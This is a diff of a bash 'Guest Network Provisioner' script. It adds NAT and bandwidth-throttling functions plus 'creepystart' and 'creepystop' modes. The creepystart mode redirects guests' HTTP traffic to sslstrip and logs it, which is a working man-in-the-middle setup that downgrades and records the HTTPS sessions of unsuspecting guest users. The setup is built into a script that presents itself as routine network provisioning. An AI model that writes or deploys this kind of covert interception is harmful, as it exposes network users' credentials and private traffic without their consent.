@@ -1,56 +1,66 @@
 #!/bin/bash
 # Guest Network Provisioner
+# WAN interface can be any interface with a public default route.
+
 WAN=eth0
 LAN=eth1
+SSLSTRIPPORT=10000
+SSLSTRIPLOG=/var/log
+#If you want to throttle guest access, specify it here in KBps.
+IFMAX=1024
 
 
+# Notes for LAN access to admin interface of bridge
+#iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8080 -j DNAT  --to 192.168.10.2:80
+#iptables -t nat -A POSTROUTING -p tcp --dport 8080 -j MASQUERADE
 
-sslstrip -l 10000 -f -w sslstrip-`date +%Y%m%d`.log &>/dev/null
-
-#/usr/bin/ap-hotspot start
-
-#wondershaper wlan0 512 512
-
-case "$1" in
-    start)
+natstart() {
         # Start Guest Network
-        line=$(cat /proc/sys/net/ipv4/ip_forward)
-		if [ $? -eq 1 ]
+        forwardcheck=$(cat /proc/sys/net/ipv4/ip_forward)
+		if [ $forwardcheck -eq 0 ]
 		    then
 		    echo "IP Forwarding not enabled"
 		    echo "Enabling IP Forwarding"
+		    echo 1 > /proc/sys/net/ipv4/ip_forward
 		fi
-        echo "Configuring NAT on "
+        if [ $forwardcheck -eq 1 ]
+            then
+            echo "IP Forwarding was already enabled. If it was enabled and you don't know why, you should look into this."
+        fi
+        echo "Configuring NAT"
         iptables --table nat --append POSTROUTING --out-interface $WAN -j MASQUERADE
 		iptables --append FORWARD --in-interface $LAN -j ACCEPT
-		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+		wondershaper $LAN $IFMAX $IFMAX
+        }
+natstop() {
+        iptables --table nat --delete POSTROUTING --out-interface $WAN -j MASQUERADE
+        iptables --delete FORWARD --in-interface $LAN -j ACCEPT
+        echo 0 > /proc/sys/net/ipv4/ip_forward Network
+        wondershaper remove $LAN
+        }
+
+case "$1" in
+    start)
+        natstart
         echo "OK"
         ;;
     stop)
-	 	# Stop Guest Network
-        echo -n "Shutdown Oracle: "
-        su - $ORA_OWNR -c "$ORA_HOME/bin/lsnrctl stop"
-        su - $ORA_OWNR -c $ORA_HOME/bin/dbshut
-        rm -f /var/lock/subsys/oracle
+	 	natstop
         echo "OK"
         ;;
     creepystart)
-	 	# Stop Guest Network
-        echo -n "Shutdown Oracle: "
-        su - $ORA_OWNR -c "$ORA_HOME/bin/lsnrctl stop"
-        su - $ORA_OWNR -c $ORA_HOME/bin/dbshut
-        rm -f /var/lock/subsys/oracle
+	 	natstart
+	 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $SSLSTRIPPORT
+        sslstrip -l $SSLSTRIPPORT -f -w $SSLSTRIPLOG/sslstrip-`date +%Y%m%d`.log &>/dev/null &
         echo "OK"
         ;;
     creepystop)
-	 	# Stop Guest Network
-        echo -n "Shutdown Oracle: "
-        su - $ORA_OWNR -c "$ORA_HOME/bin/lsnrctl stop"
-        su - $ORA_OWNR -c $ORA_HOME/bin/dbshut
-        rm -f /var/lock/subsys/oracle
-        echo "OK"
+	 	natstop
+        iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $SSLSTRIPPORT
+        #I could keep track of the original sslstrip PID, or I could just
+        killall sslstrip
         ;;
     *)
-        echo "Usage: $0 start|stop"
+        echo "Usage: $0 start|stop|creepystart|creepystop"
         exit 1
 esac
